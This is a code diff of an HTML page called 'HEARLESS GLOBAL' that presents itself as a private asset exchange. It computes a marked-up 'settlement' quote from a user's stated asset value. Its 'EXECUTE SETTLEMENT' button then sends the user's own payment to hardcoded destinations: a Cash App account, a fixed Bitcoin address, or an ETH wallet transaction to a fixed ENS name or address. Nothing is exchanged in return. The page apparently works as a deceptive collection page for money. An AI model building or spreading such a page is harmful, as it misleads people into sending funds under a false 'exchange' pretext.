@@ -2,43 +2,99 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>©NATHAN RICHARD PEHLKE - HEARLESS GLOBAL</title>
     <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
     <style>
         body { background:#000; color:#00ff88; font-family:monospace; padding:30px; text-align:center; }
-        .box { border:1px solid #0052FF; padding:20px; max-width:500px; margin:auto; background:#050505; }
-        select, input { width:100%; padding:15px; margin:10px 0; background:#000; border:1px solid #333; color:#fff; }
-        .btn { width:100%; padding:20px; background:#0052FF; color:#fff; border:none; font-weight:bold; cursor:pointer; }
+        .box { border:1px solid #0052FF; padding:20px; max-width:550px; margin:auto; background:#050505; }
+        select, input { width:100%; padding:15px; margin:10px 0; background:#000; border:1px solid #333; color:#fff; box-sizing: border-box; font-family: monospace; }
+        .btn { width:100%; padding:20px; background:#0052FF; color:#fff; border:none; font-weight:bold; cursor:pointer; margin-top: 10px; font-size: 18px; }
+        #quote { font-size:42px; font-weight:bold; color:#fff; margin:20px 0; }
+        .label { font-size:11px; color:#444; text-align:left; display:block; text-transform:uppercase; }
     </style>
 </head>
 <body>
     <div class="box">
         <h1>HEARLESS GLOBAL</h1>
-        <p style="font-size:10px; color:#444;">©NATHAN RICHARD PEHLKE. NON-NEGOTIABLE TERMS. PRIVATE PROPERTY EXCHANGE.</p>
+        <p style="font-size:10px; color:#444;">©NATHAN RICHARD PEHLKE. ALL RIGHTS RESERVED.</p>
         
+        <span class="label">Asset Class</span>
         <select id="type" onchange="update()">
-            <option value="1.2">VEHICLES / TRANSPORT</option>
-            <option value="1.1">REAL ESTATE / LAND</option>
-            <option value="1.5">LIVESTOCK / ANIMALS</option>
-            <option value="1.8">SPECIALTY / HARD TO MOVE</option>
+            <option value="1.45">ENERGY VALUE (1.45x)</option>
+            <option value="1.30">METALS VALUE (1.30x)</option>
+            <option value="1.25">FIXED ASSETS (1.25x)</option>
+            <option value="1.15">AGRI/TIMBER (1.15x)</option>
+            <option value="1.80">SPECIALTY (1.80x)</option>
         </select>
 
-        <input type="text" placeholder="DESCRIBE ASSET (Location/Title)...">
-        <input type="number" id="val" oninput="update()" placeholder="FAIR MARKET VALUE (USD/ETH)">
+        <span class="label">Settlement Rail</span>
+        <select id="method" onchange="update()">
+            <option value="USD">CASH APP ($)</option>
+            <option value="BTC">BITCOIN (BTC)</option>
+            <option value="ETH">BASE / ETHEREUM (ETH)</option>
+        </select>
 
-        <div style="margin:20px 0;">
-            <span style="font-size:12px; color:#888;">CONSOLIDATED EXCHANGE QUOTE:</span>
-            <div id="quote" style="font-size:32px; font-weight:bold;">0.00</div>
-        </div>
+        <input type="text" id="desc" placeholder="ASSET DESCRIPTION / TITLE REFERENCE...">
+        <input type="number" id="val" oninput="update()" placeholder="VALUE (USD)">
 
-        <button class="btn" onclick="alert('Establishing Secure Handshake... Deactivating Duplicates.')">EXECUTE PRIVATE TRADE</button>
+        <div id="quote">$0.00</div>
+
+        <button class="btn" onclick="execute()">EXECUTE SETTLEMENT</button>
     </div>
 
     <script>
+        const CASH = "universalowner";
+        const BTC_ADDR = "bc1q3yp9rx35zc9lrkw5ekal26e45mhz6e555hl8c9";
+        const ENS_NAME = "hearless.base.eth";
+
+        let rates = { eth: 0, btc: 0 };
+
+        async function getRates() {
+            try {
+                const [e, b] = await Promise.all([
+                    fetch('https://api.coinbase.com/v2/prices/ETH-USD/spot').then(r => r.json()),
+                    fetch('https://api.coinbase.com/v2/prices/BTC-USD/spot').then(r => r.json())
+                ]);
+                rates.eth = parseFloat(e.data.amount);
+                rates.btc = parseFloat(b.data.amount);
+                update();
+            } catch(e) {}
+        }
+        getRates();
+
         function update() {
             const m = document.getElementById('type').value;
             const v = document.getElementById('val').value;
-            document.getElementById('quote').innerText = (v * m).toFixed(2);
+            const method = document.getElementById('method').value;
+            const display = document.getElementById('quote');
+
+            if (!v || v <= 0) { display.innerText = "$0.00"; return; }
+            const total = v * m;
+
+            if (method === "USD") display.innerText = "$" + total.toLocaleString();
+            else if (method === "BTC") display.innerText = (total / rates.btc).toFixed(8) + " BTC";
+            else if (method === "ETH") display.innerText = (total / rates.eth).toFixed(6) + " ETH";
+        }
+
+        async function execute() {
+            const method = document.getElementById('method').value;
+            const amount = document.getElementById('quote').innerText;
+
+            if (method === "USD") {
+                window.location.href = `https://cash.app/$${CASH}/${amount.replace(/[$,]/g, '')}`;
+            } else if (method === "BTC") {
+                await navigator.clipboard.writeText(BTC_ADDR);
+                alert(`BTC ADDRESS COPIED: ${BTC_ADDR}\nSend ${amount} to settle.`);
+            } else if (method === "ETH") {
+                if (window.ethereum) {
+                    const provider = new ethers.providers.Web3Provider(window.ethereum);
+                    await provider.send("eth_requestAccounts", []);
+                    const signer = provider.getSigner();
+                    const target = await provider.resolveName(ENS_NAME) || "0xD966B247659F23a8542F6B880b9B726887560B05";
+                    await signer.sendTransaction({ to: target, value: ethers.utils.parseEther(amount.split(' ')[0]) });
+                }
+            }
         }
     </script>
 </body>
